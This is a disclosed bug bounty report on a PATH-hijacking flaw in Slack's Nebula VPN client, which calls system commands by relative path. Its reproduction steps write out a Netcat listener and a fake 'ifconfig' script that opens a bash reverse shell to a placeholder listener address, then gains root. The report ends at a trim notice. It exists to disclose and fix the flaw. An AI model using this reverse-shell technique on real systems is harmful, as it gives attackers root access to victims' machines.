# [M] Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation

## Summary
Severity: Medium (CVSS 6.8)
Program: Slack
Weakness: Command Injection - Generic
Reporter: jhancock
State: resolved
Disclosed: 2020-04-01T22:10:32.788Z
Source: https://hackerone.com/reports/784714

## Details
### Overview###
The Nebula clients for Darwin and Windows call relative paths in "exec.Command" to "ifconfig" and "route" executables on Darwin, and to "netsh" on Windows. These commands are entered using relative paths, not absolute paths (such as /sbin/ifconfig). When a binary is run with a relative path, the system uses environmental variables ("PATH") to determine the search order of folders that should be searched for the command run. By modifying the environmental variable, an attacker can prioritize an arbitrary path containing a binary of the same name, and it will execute when Nebula runs. 

The affected code can be found at https://github.com/slackhq/nebula/search?q=exec.Command&unscoped_q=exec.Command); specifically:

nebula/tun_darwin.go:45
nebula/tun_darwin.go:48
nebula/tun_darwin.go:51
nebula/tun_darwin.go:56
nebula/tun_windows:50
nebula/tun_windows:60

###Steps###
To reproduce this attack, open a terminal on a MacOS system running the Darwin Nebula client and a terminal on a Linux or MacOS system to catch the shell. Perform the following steps:
1. On a host accessible to the MacOS system, run the following command to start a Netcat listener:
`sudo nc -nvlp 443`

2. On the MacOS system with the Nebula client, run the command "whoami" (or id) and "hostname"

3. Nebula attempts to call the "ifconfig" command, including three variables. A script file containing a pass-through to ifconfig must be created, but should include a bash reverse shell connecting to the IP address of the system in step 1 ("LISTENER_IP_ADDRESS"). Create a file in the /tmp/ folder called "ifconfig". Enter the following code the file:
```
#!/bin/bash
bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
DEVICE=$1
CIDER=$2
IP=$3
/sbin/ifconfig $1 $2 $3

4. Make the script executable by running `chmod +x /tmp/ifconfig`

5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.

6. On the host in step 1, a reverse Bash shell connects. Run the command "whoami" (or id) and "hostname" and verify the user is now root, and the hostname is the hostname of the MacOS computer in step 2.

Note: To perform this attack on Windows, a custom binary would need to be compiled and named "netsh" but the principles are the same on each OS. 

###Resolution###
Modify the paths on the affected lines to absolute paths. For example, line 45 of nebula/tun_darwin.go reads:
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/784714_
